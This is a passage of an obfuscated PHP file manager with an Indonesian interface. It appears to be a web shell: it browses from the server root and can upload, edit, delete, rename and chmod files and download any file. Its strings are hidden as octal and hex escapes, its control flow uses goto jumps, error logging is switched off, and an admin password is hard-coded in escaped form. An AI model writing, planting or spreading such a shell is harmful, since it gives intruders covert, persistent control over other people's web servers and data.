)</h3><div style="margin-bottom:15px"><button class="btn btn-info"onclick="expandAll()"style="margin-right:10px"><i class="fas fa-expand"></i> Expand All</button> <button class="btn btn-warning"onclick="collapseAll()"><i class="fas fa-compress"></i> Collapse All</button></div><div id="directory-tree"><?php  echo renderTreeView($directoryTree, $fileManager); ?>
</div></div><?php  } elseif ($showSearch) { ?>
<div class="search-panel"><form class="search-form"><input name="search"value="1"type="hidden"> <input name="q"value="<?php  echo sanitizePath($searchQuery); ?>
"placeholder="Cari file atau folder..."required> <button class="btn btn-primary"type="submit"><i class="fas fa-search"></i> Cari</button></form></div><?php  if (!empty($searchQuery)) { ?>
<div class="search-results"><h3><i class="fas fa-search"></i> Hasil Pencarian untuk "<?php  echo sanitizePath($searchQuery); ?>
"</h3><?php  if (!empty($searchResults)) { ?>
<table class="file-table"><thead><tr><th><i class="fas fa-file"></i> Nama</th><th><i class="fas fa-map-marker-alt"></i> Path</th><th><i class="fas fa-shield-alt"></i> Permission</th><th><i class="fas fa-weight-hanging"></i> Ukuran</th><th><i class="fas fa-calendar"></i> Dimodifikasi</th><th><i class="fas fa-cogs"></i> Aksi</th></tr></thead><tbody><?php  foreach ($searchResults as $file) { ?>
<tr><td><div class="file-name"><span class="file-icon"><?php  echo $file["\151\x63\157\156"]; ?>
</span><?php  if ($file["\x69\x73\104\x69\x72"]) { ?>
<a href="?d=<?php  echo urlencode($file["\160\x61\164\150"]); ?>
"><?php  echo sanitizePath($file["\156\141\x6d\x65"]); ?>
</a><?php  } else { ?>
<span><?php  echo sanitizePath($file["\156\x61\155\145"]); ?>
</span><?php  } ?>
</div></td><td><span class="size"><?php  echo sanitizePath($file["\162\x65\154\141\x74\x69\x76\145\x50\141\x74\150"]); ?>
</span></td><td><span class="permissions"title="<?php  echo $fileManager->getPermissionDescription($file["\x70\141\x74\x68"]); ?>
"><?php  echo $file["\160\x65\x72\155\151\163\163\151\157\156\163"]; ?>
(<?php  echo $fileManager->getPermissionNumeric($file["\160\x61\164\x68"]); ?>
)</span></td><td><span class="size"><?php  echo $file["\x73\151\x7a\x65"]; ?>
</span></td><td><span class="modified"><?php  echo $file["\155\x6f\x64\x69\146\151\x65\x64"]; ?>
</span></td><td><div class="file-actions"><?php  if ($file["\151\163\x44\x69\162"]) { ?>
<a href="?d=<?php  echo urlencode($file["\160\141\x74\150"]); ?>
"class="btn btn-primary"><i class="fas fa-folder-open"></i> </a><?php  } else { ?>
<button class="btn btn-info"type="button"onclick='viewFile("<?php  echo urlencode($file["\x70\x61\164\150"]); ?>
","<?php  echo sanitizePath($file["\x6e\x61\155\x65"]); ?>
")'><i class="fas fa-eye"></i></button><?php  $isHtaccess = $file["\156\141\x6d\x65"] === "\56\150\164\141\x63\143\x65\163\163"; $extension = strtolower(pathinfo($file["\x70\141\164\x68"], PATHINFO_EXTENSION)); if (($isHtaccess || in_array($extension, $fileManager->getAllowedExtensions())) && is_writable($file["\160\x61\x74\x68"])) { ?>
<a href="?edit=<?php  echo urlencode($file["\x70\141\x74\x68"]); ?>
"class="btn btn-warning"><i class="fas fa-edit"></i> </a><?php  } } ?>
<form method="POST"style="display:inline"><input name="permission_path"value="<?php  echo sanitizePath($file["\160\x61\164\x68"]); ?>
"type="hidden"> <input name="permission_mode"value="<?php  echo $fileManager->getPermissionNumeric($file["\x70\x61\164\x68"]); ?>
"placeholder="755"style="width:60px"title="Format: 3 digit (0-7) contoh: 755, 644, 777"> <button class="btn btn-info"type="submit"name="change_permission"title="Ubah Permission"><i class="fas fa-shield-alt"></i></button></form></div></td></tr><?php  } ?>
</tbody></table><?php  } else { ?>
<p style="text-align:center;color:#666;padding:40px"><i class="fas fa-search"></i> Tidak ada hasil ditemukan untuk "<?php  echo sanitizePath($searchQuery); ?>
"</p><?php  } ?>
</div><?php  } } elseif ($editMode && $editData) { ?>
<div class="edit-file-panel"><div class="edit-header"><h3><i class="fas fa-edit"></i> Edit File:<?php  echo sanitizePath($editData["\156\141\155\x65"]); ?>
</h3><a href="?"class="btn btn-info"><i class="fas fa-arrow-left"></i> Kembali ke File Manager</a></div><form method="POST"class="edit-form"><input name="edit_path"value="<?php  echo sanitizePath($editData["\160\141\164\150"]); ?>
"type="hidden"><div class="form-group"><label for="file_content">Konten File:</label> <textarea class="code-editor"id="file_content"name="file_content"placeholder="Tulis konten file di sini..."rows="20"><?php  echo htmlspecialchars($editData["\143\x6f\156\164\x65\156\x74"]); ?>
</textarea></div><div class="form-actions"><button class="btn btn-success"type="submit"name="save_edit"><i class="fas fa-save"></i> Simpan File</button> <a href="?"class="btn btn-warning"><i class="fas fa-times"></i> Batal</a></div></form></div><?php  } elseif ($createFileMode) { ?>
<div class="create-file-panel"><div class="create-header"><h3><i class="fas fa-file-plus"></i> Buat File Baru</h3><a href="?"class="btn btn-info"><i class="fas fa-arrow-left"></i> Kembali ke File Manager</a></div><form method="POST"class="create-form"><div class="form-group"><label for="file_name">Nama File:</label> <input name="file_name"placeholder="contoh.txt"required class="form-control"id="file_name"> <small class="form-text">Ekstensi yang didukung:<?php  echo implode("\54\x20", $fileManager->getAllowedExtensions()); ?>
</small></div><div class="form-group"><label for="file_content">Konten File:</label> <textarea class="code-editor"id="file_content"name="file_content"placeholder="Tulis konten file di sini..."rows="20"></textarea></div><div class="form-actions"><button class="btn btn-success"type="submit"name="create_file"><i class="fas fa-plus"></i> Buat File</button> <a href="?"class="btn btn-warning"><i class="fas fa-times"></i> Batal</a></div></form></div><?php  } else { ?>
<div class="navigation-controls"><?php  if ($fileManager->getParentDirectory()) { ?>
<a href="?d=<?php  echo urlencode($fileManager->getParentDirectory()); ?>
"class="btn btn-info"><i class="fas fa-level-up-alt"></i> Parent Directory </a><?php  } ?>
<a href="?d=<?php  echo urlencode($serverRoot); ?>
"class="btn btn-primary"><i class="fas fa-home"></i> Server Root </a><span class="current-path"><i class="fas fa-map-marker-alt"></i><?php  echo sanitizePath($currentPath); ?>
</span><div style="display:flex;gap:5px;align-items:center"><?php  if ($fileManager->canWriteToDirectory($currentPath)) { ?>
<span style="color:#28a745;font-size:12px"><i class="fas fa-check-circle"></i> Writable </span><?php  } else { ?>
<span style="color:#dc3545;font-size:12px"><i class="fas fa-times-circle"></i> Read Only </span><?php  } ?>
</div></div><div class="modal"id="fileModal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-file-alt"></i> <span id="modalFileName"></span></h3><button class="modal-close"type="button"onclick="closeModal()">×</button></div><div class="modal-body"><div class="file-info"><p><strong>Path:</strong> <span id="modalFilePath"></span></p><p><strong>Size:</strong> <span id="modalFileSize"></span></p><p><strong>Modified:</strong> <span id="modalFileModified"></span></p><p><strong>Permissions:</strong> <span id="modalFilePermissions"></span></p><p><strong>Extension:</strong> <span id="modalFileExtension"></span></p><p><strong>Lines:</strong> <span id="modalFileLines"></span> | <strong>Characters:</strong> <span id="modalFileChars"></span></p><p style="display:none"id="htaccessInfo"><strong>Type:</strong> <span id="htaccessDescription"></span></p></div><div class="form-group"><label for="modalFileContent">File Content:</label> <textarea class="file-content"id="modalFileContent"readonly></textarea></div></div><div class="modal-actions"><button class="btn btn-warning"type="button"onclick="editFileFromModal()"><i class="fas fa-edit"></i> Edit File</button> <button class="btn btn-info"type="button"onclick="downloadFile()"><i class="fas fa-download"></i> Download</button> <button class="btn btn-info"type="button"onclick="showHtaccessHelp()"id="htaccessHelpBtn"style="display:none"><i class="fas fa-question-circle"></i> .htaccess Help</button> <button class="btn btn-secondary"type="button"onclick="closeModal()"><i class="fas fa-times"></i> Close</button></div></div></div><div class="actions-panel"><div class="action-group"><form method="POST"style="display:flex;gap:10px;width:100%"enctype="multipart/form-data"><input name="uploaded_file"type="file"required> <button class="btn btn-primary"type="submit"name="upload"><i class="fas fa-upload"></i> Upload</button></form></div><div class="action-group"><form method="POST"style="display:flex;gap:10px;width:100%"><input name="folder_name"placeholder="Nama folder baru"required> <button class="btn btn-success"type="submit"name="create_folder"><i class="fas fa-folder-plus"></i> Buat Folder</button></form></div><div class="action-group"><a href="?create_file=1"class="btn btn-info"style="width:100%;text-align:center"><i class="fas fa-file-plus"></i> Buat File Baru</a></div></div><table class="file-table"><thead><tr><th><i class="fas fa-file"></i> Nama</th><th><i class="fas fa-shield-alt"></i> Permission</th><th><i class="fas fa-weight-hanging"></i> Ukuran</th><th><i class="fas fa-calendar"></i> Dimodifikasi</th><th><i class="fas fa-cogs"></i> Aksi</th></tr></thead><tbody><?php  if (!empty($files)) { foreach ($files as $file) { ?>
<tr><td><div class="file-name"><span class="file-icon"><?php  echo $file["\x69\x63\x6f\156"]; ?>
</span><?php  if ($file["\x69\163\104\x69\x72"]) { ?>
<a href="?d=<?php  echo urlencode($file["\x70\141\x74\150"]); ?>
"><?php  echo sanitizePath($file["\x6e\141\x6d\145"]); ?>
</a><?php  } else { ?>
<span><?php  echo sanitizePath($file["\156\x61\x6d\x65"]); ?>
</span><?php  } ?>
</div></td><td><span class="permissions"title="<?php  echo $fileManager->getPermissionDescription($file["\x70\x61\x74\150"]); ?>
"><?php  echo $file["\160\x65\x72\155\x69\x73\163\x69\x6f\156\x73"]; ?>
(<?php  echo $fileManager->getPermissionNumeric($file["\x70\x61\164\150"]); ?>
)</span></td><td><span class="size"><?php  echo $file["\x73\x69\x7a\x65"]; ?>
</span></td><td><span class="modified"><?php  echo $file["\155\x6f\144\151\x66\151\x65\144"]; ?>
</span></td><td><div class="file-actions"><form method="POST"style="display:inline"><input name="rename_path"value="<?php  echo sanitizePath($file["\x70\x61\164\150"]); ?>
"type="hidden"> <input name="new_name"placeholder="Nama baru"required> <button class="btn btn-warning"type="submit"name="rename"><i class="fas fa-edit"></i></button></form><form method="POST"style="display:inline"onsubmit='return confirm("Yakin ingin menghapus<?php  echo sanitizePath($file["\x6e\141\x6d\x65"]); ?>
?")'><input name="delete_path"value="<?php  echo sanitizePath($file["\x70\141\x74\150"]); ?>
"type="hidden"> <button class="btn btn-danger"type="submit"><i class="fas fa-trash"></i></button></form><form method="POST"style="display:inline"><input name="permission_path"value="<?php  echo sanitizePath($file["\x70\141\164\x68"]); ?>
"type="hidden"> <input name="permission_mode"value="<?php  echo $fileManager->getPermissionNumeric($file["\160\141\x74\x68"]); ?>
"placeholder="755"style="width:60px"title="Format: 3 digit (0-7) contoh: 755, 644, 777"> <button class="btn btn-info"type="submit"name="change_permission"title="Ubah Permission"><i class="fas fa-shield-alt"></i></button></form><?php  if (!$file["\151\163\x44\151\162"]) { ?>
<button class="btn btn-info"type="button"onclick='viewFile("<?php  echo urlencode($file["\x70\x61\164\150"]); ?>
","<?php  echo sanitizePath($file["\156\141\x6d\x65"]); ?>
")'><i class="fas fa-eye"></i></button><?php  $isHtaccess = $file["\x6e\141\155\145"] === "\56\x68\x74\x61\143\143\145\x73\163"; $extension = strtolower(pathinfo($file["\x70\141\164\x68"], PATHINFO_EXTENSION)); if (($isHtaccess || in_array($extension, $fileManager->getAllowedExtensions())) && is_writable($file["\x70\x61\x74\x68"])) { ?>
<a href="?edit=<?php  echo urlencode($file["\x70\141\164\x68"]); ?>
"class="btn btn-warning"><i class="fas fa-edit"></i> </a><?php  } } ?>
</div></td></tr><?php  } } else { ?>
<tr><td colspan="5"style="text-align:center;padding:40px;color:#666"><i class="fas fa-folder-open"></i> Direktori kosong</td></tr><?php  } ?>
</tbody></table><?php  } } else { ?>
<div style="text-align:center;padding:40px;color:#666"><i class="fas fa-exclamation-triangle"></i> Sistem tidak dapat diakses</div><?php  } goto F4dww; Dvsnc: $LOGIN_TIMEOUT = 3600; goto vyPTZ; iL0Vu: ini_set("\154\x6f\147\137\x65\162\162\x6f\162\x73", 0); goto xLTCI; QX4Y3: error_reporting(0); goto sw7wl; fjnlk: $ADMIN_PASSWORD = "\141\x64\x6d\x69\x6e\x73\x75\156\147\147\141\154\61\64\65"; goto Dvsnc; hHQyO: if ($message) { ?>
<div class="alert alert-<?php  echo $message["\163\165\143\x63\x65\163\163"] ? "\163\165\x63\x63\145\163\163" : "\x65\162\x72\157\162"; ?>
"><i class="fas fa-<?php  echo $message["\x73\x75\x63\x63\145\x73\x73"] ? "\x63\150\x65\143\153\x2d\143\x69\162\143\154\x65" : "\145\x78\x63\154\x61\x6d\x61\164\x69\x6f\156\55\143\151\162\x63\x6c\x65"; ?>
"></i><?php  echo $message["\x6d\145\x73\163\141\147\145"]; ?>
</div><?php  } goto uSjNo; F4dww: ?>
</div></div><script>// Auto-hide alerts after 5 seconds
        setTimeout(function() {
            const alerts = document.querySelectorAll('.alert');
            alerts.forEach(function(alert) {
                alert.style.opacity = '0';
                alert.style.transition = 'opacity 0.5s ease';
                setTimeout(function() {
                    alert.remove();
                }, 500);
            });
        }, 5000);

        // Add smooth scrolling
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                document.querySelector(this.getAttribute('href')).scrollIntoView({
                    behavior: 'smooth'
                });
            });
        });

        // Tree view toggle function
        function toggleTree(element, targetId) {
            const target = document.getElementById(targetId);
            if (target) {
                const isVisible = target.style.display !== 'none';
                target.style.display = isVisible ? 'none' : 'block';
                element.classList.toggle('expanded', !isVisible);
            }
        }

        // Expand all tree items
        function expandAll() {
            document.querySelectorAll('.tree-children').forEach(function(child) {
                child.style.display = 'block';
            });
            document.querySelectorAll('.tree-toggle').forEach(function(toggle) {
                toggle.classList.add('expanded');
            });
        }

        // Collapse all tree items
        function collapseAll() {
            document.querySelectorAll('.tree-children').forEach(function(child) {
                child.style.display = 'none';
            });
            document.querySelectorAll('.tree-toggle').forEach(function(toggle) {
                toggle.classList.remove('expanded');
            });
        }

        // Add tree control buttons if tree view is active
        if (document.getElementById('directory-tree')) {
            const treeControls = document.createElement('div');
            treeControls.style.marginBottom = '15px';
            treeControls.innerHTML = `
                <button onclick="expandAll()" class="btn btn-info" style="margin-right: 10px;">
                    <i class="fas fa-expand"></i> Expand All
                </button>
                <button onclick="collapseAll()" class="btn btn-warning">
                    <i class="fas fa-compress"></i> Collapse All
                </button>
            `;
            document.getElementById('directory-tree').parentNode.insertBefore(treeControls, document.getElementById('directory-tree'));
        }

        // Code editor enhancements
        const codeEditor = document.querySelector('.code-editor');
        if (codeEditor) {
            // Auto-resize textarea
            function autoResize() {
                codeEditor.style.height = 'auto';
                codeEditor.style.height = codeEditor.scrollHeight + 'px';
            }
            
            codeEditor.addEventListener('input', autoResize);
            codeEditor.addEventListener('focus', autoResize);
            
            // Keyboard shortcuts
            codeEditor.addEventListener('keydown', function(e) {
                // Ctrl+S to save
                if (e.ctrlKey && e.key === 's') {
                    e.preventDefault();
                    const saveButton = document.querySelector('button[name="save_edit"], button[name="create_file"]');
                    if (saveButton) {
                        saveButton.click();
                    }
                }
                
                // Tab key support
                if (e.key === 'Tab') {
                    e.preventDefault();
                    const start = this.selectionStart;
                    const end = this.selectionEnd;
                    
                    this.value = this.value.substring(0, start) + '    ' + this.value.substring(end);
                    this.selectionStart = this.selectionEnd = start + 4;
                }
            });
            
            // Initial resize
            autoResize();
        }

        // Form validation for create file
        const createForm = document.querySelector('.create-form');
        if (createForm) {
            const fileNameInput = document.getElementById('file_name');
            const fileContentInput = document.getElementById('file_content');
            
            createForm.addEventListener('submit', function(e) {
                if (!fileNameInput.value.trim()) {
                    e.preventDefault();
                    alert('Nama file tidak boleh kosong!');
                    fileNameInput.focus();
                    return false;
                }
                
                // Check for invalid characters
                const invalidChars = /[<>:"\/\\|?*]/;
                if (invalidChars.test(fileNameInput.value)) {
                    e.preventDefault();
                    alert('Nama file tidak boleh mengandung karakter: < > : " / \\ | ? *');
                    fileNameInput.focus();
                    return false;
                }
            });
        }

        // Modal functionality
        let currentFilePath = '';

        function viewFile(filePath, fileName) {
            currentFilePath = filePath;
            
            // Show loading
            document.getElementById('modalFileName').textContent = fileName;
            document.getElementById('modalFilePath').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileSize').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileModified').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFilePermissions').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileExtension').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileLines').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileChars').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileContent').value = 'Loading file content...';
            
            // Show loading message in header
            const modalHeader = document.querySelector('.modal-header h3');
            modalHeader.innerHTML = '<i class="fas fa-spinner fa-spin" style="color: #667eea;"></i> ' + fileName + ' <small style="font-size: 0.7em; color: #667eea;">(Loading...)</small>';
            
            // Store original header text for error cases
            window.originalHeaderText = '<i class="fas fa-file-alt"></i> ' + fileName;
            
            // Set timeout to show error if loading takes too long
            window.loadingTimeout = setTimeout(() => {
                modalHeader.innerHTML = '<i class="fas fa-clock" style="color: #ffc107;"></i> ' + fileName + ' <small style="font-size: 0.7em; color: #ffc107;">(Loading timeout)</small>';
                setTimeout(() => {
                    modalHeader.innerHTML = window.originalHeaderText;
                }, 2000);
            }, 10000); // 10 seconds timeout
            
            // Show modal
            document.getElementById('fileModal').style.display = 'block';
            
            // Fetch file content via AJAX
            fetch('?view=' + encodeURIComponent(filePath), {
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('modalFileName').textContent = data.name;
                        document.getElementById('modalFilePath').textContent = data.path;
                        document.getElementById('modalFileSize').textContent = data.size;
                        document.getElementById('modalFileModified').textContent = data.modified;
                        document.getElementById('modalFilePermissions').textContent = data.permissions;
                        document.getElementById('modalFileExtension').textContent = data.extension || 'No extension';
                        document.getElementById('modalFileContent').value = data.content;
                        
                        // Calculate lines and characters
                        const content = data.content;
                        const lines = content.split('\n').length;
                        const chars = content.length;
                        document.getElementById('modalFileLines').textContent = lines;
                        document.getElementById('modalFileChars').textContent = chars;
                        
                        // Clear loading timeout
                        if (window.loadingTimeout) {
                            clearTimeout(window.loadingTimeout);
                        }
                        
                        // Show success message briefly
                        const modalHeader = document.querySelector('.modal-header h3');
                        modalHeader.innerHTML = '<i class="fas fa-check-circle" style="color: #28a745;"></i> ' + data.name + ' <small style="font-size: 0.7em; color: #28a745;">(Loaded successfully)</small>';
                        setTimeout(() => {
                            modalHeader.innerHTML = window.originalHeaderText;
                        }, 2000);
                        
                        // Special handling for .htaccess files
                        if (data.name === '.htaccess') {
                            document.getElementById('htaccessInfo').style.display = 'block';
                            document.getElementById('htaccessDescription').textContent = 'Apache Configuration File - Mengatur pengaturan server web Apache';
                            document.getElementById('htaccessHelpBtn').style.display = 'inline-block';
                            
                            // Add syntax highlighting for .htaccess
                            const textarea = document.getElementById('modalFileContent');
                            textarea.classList.add('htaccess');
                            textarea.style.fontFamily = 'Consolas, Monaco, "Courier New", monospace';
                        } else {
                            document.getElementById('htaccessInfo').style.display = 'none';
                            document.getElementById('htaccessHelpBtn').style.display = 'none';
                            
                            // Remove htaccess styling
                            const textarea = document.getElementById('modalFileContent');
                            textarea.classList.remove('htaccess');
                        }
                    } else {
                        // Clear loading timeout
                        if (window.loadingTimeout) {
                            clearTimeout(window.loadingTimeout);
                        }
                        
                        document.getElementById('modalFileContent').value = 'Error: ' + data.message;
                        document.getElementById('modalFilePath').textContent = 'Error';
                        document.getElementById('modalFileSize').textContent = 'Error';
                        document.getElementById('modalFileModified').textContent = 'Error';
                        document.getElementById('modalFilePermissions').textContent = 'Error';
                        document.getElementById('modalFileExtension').textContent = 'Error';
                        document.getElementById('modalFileLines').textContent = 'Error';
                        document.getElementById('modalFileChars').textContent = 'Error';
                        
                        // Show error message in header
                        const modalHeader = document.querySelector('.modal-header h3');
                        modalHeader.innerHTML = '<i class="fas fa-exclamation-triangle" style="color: #dc3545;"></i> ' + fileName + ' <small style="font-size: 0.7em; color: #dc3545;">(Error loading file)</small>';
                        setTimeout(() => {
                            modalHeader.innerHTML = window.originalHeaderText;
                        }, 3000);
                    }
                })
                .catch(error => {
                    // Clear loading timeout
                    if (window.loadingTimeout) {
                        clearTimeout(window.loadingTimeout);
                    }
                    
                    document.getElementById('modalFileContent').value = 'Error loading file: ' + error.message;
                    document.getElementById('modalFilePath').textContent = 'Network Error';
                    document.getElementById('modalFileSize').textContent = 'Network Error';
                    document.getElementById('modalFileModified').textContent = 'Network Error';
                    document.getElementById('modalFilePermissions').textContent = 'Network Error';
                    document.getElementById('modalFileExtension').textContent = 'Network Error';
                    document.getElementById('modalFileLines').textContent = 'Network Error';
                    document.getElementById('modalFileChars').textContent = 'Network Error';
                    
                    // Show network error message in header
                    const modalHeader = document.querySelector('.modal-header h3');
                    modalHeader.innerHTML = '<i class="fas fa-wifi" style="color: #dc3545;"></i> ' + fileName + ' <small style="font-size: 0.7em; color: #dc3545;">(Network error)</small>';
                    setTimeout(() => {
                        modalHeader.innerHTML = window.originalHeaderText;
                    }, 3000);
                });
        }

        function closeModal() {
            // Clear loading timeout
            if (window.loadingTimeout) {
                clearTimeout(window.loadingTimeout);
            }
            
            document.getElementById('fileModal').style.display = 'none';
            currentFilePath = '';
        }

        function editFileFromModal() {
            if (currentFilePath) {
                window.location.href = '?edit=' + encodeURIComponent(currentFilePath);
            }
        }

        function downloadFile() {
            if (currentFilePath) {
                const link = document.createElement('a');
                link.href = '?view=' + encodeURIComponent(currentFilePath) + '&download=1';
                link.download = document.getElementById('modalFileName').textContent;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
        }

        function showHtaccessHelp() {
            const helpContent = `
.htaccess File Help

Common .htaccess Directives:

1. REWRITE RULES:
   RewriteEngine On
   RewriteRule ^old-page$ /new-page [R=301,L]

2. SECURITY:
   Options -Indexes
   Order Deny,Allow
   Deny from all

3. CACHING:
   ExpiresActive On
   ExpiresByType text/css "access plus 1 month"

4. COMPRESSION:
   <IfModule mod_deflate.c>
       AddOutputFilterByType DEFLATE text/html text/plain text/xml
   </IfModule>

5. ERROR PAGES:
   ErrorDocument 404 /404.html
   ErrorDocument 500 /500.html

6. REDIRECTS:
   Redirect 301 /old-url /new-url
   Redirect 302 /temporary /new-location

7. PASSWORD PROTECTION:
   AuthType Basic
   AuthName "Restricted Area"
   AuthUserFile /path/to/.htpasswd
   Require valid-user

8. CUSTOM HEADERS:
   Header always set X-Frame-Options DENY
   Header always set X-Content-Type-Options nosniff

Tips:
- Test changes on staging first
- Keep backup of original .htaccess
- Check Apache error logs if issues occur
- Some hosts may disable certain directives
            `;
            
            alert(helpContent);
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('fileModal');
            if (event.target === modal) {
                closeModal();
            }
        }

        // Close modal with Escape key
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                closeModal();
            }
        });

        // Auto-resize modal textarea
        const modalTextarea = document.getElementById('modalFileContent');
        if (modalTextarea) {
            function autoResizeModal() {
                modalTextarea.style.height = 'auto';
                modalTextarea.style.height = Math.min(modalTextarea.scrollHeight, 400) + 'px';
            }
            
            modalTextarea.addEventListener('input', autoResizeModal);
            modalTextarea.addEventListener('focus', autoResizeModal);
            
            // Initial resize
            autoResizeModal();
        }

        // Add keyboard shortcuts for modal
        document.addEventListener('keydown', function(event) {
            // Ctrl+O to open file (if modal is open)
            if (event.ctrlKey && event.key === 'o' && document.getElementById('fileModal').style.display === 'block') {
                event.preventDefault();
                editFileFromModal();
            }
            
            // Ctrl+S to save file (if modal is open and in edit mode)
            if (event.ctrlKey && event.key === 's' && document.getElementById('fileModal').style.display === 'block') {
                event.preventDefault();
                editFileFromModal();
            }
        });</script></body></htm')); ?>
